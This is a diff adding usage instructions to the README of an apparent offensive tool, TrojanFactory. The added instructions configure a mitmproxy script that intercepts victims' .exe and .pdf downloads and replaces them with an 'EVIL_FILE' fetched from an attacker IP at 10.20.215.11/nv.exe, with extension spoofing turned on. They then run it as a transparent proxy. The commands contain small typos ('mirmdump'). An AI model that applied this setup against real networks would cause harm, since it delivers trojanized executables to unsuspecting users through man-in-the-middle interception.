@@ -327,7 +327,21 @@ python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path)
 ```
 run it
 ```
-mirmdump -s script.py
+mirmdump -s script.py -transparent
+```
+
+mitmproxy_script.py from TrojanFactory  
+Modifie this:  
+```
+IP = "10.20.215.11"
+TARGET_TEXTENSIONS = [".exe", ".pdf"]
+EVIL_FILE = "http://10.20.215.11/nv.exe"
+WEB_ROOT = "/var/www/html/"
+SPOOF_EXTENSION = True
+```
+run it
+```
+mirmdump -s mitmproxy_script.py -transparent
 ```
 
 2 Main operation modes:
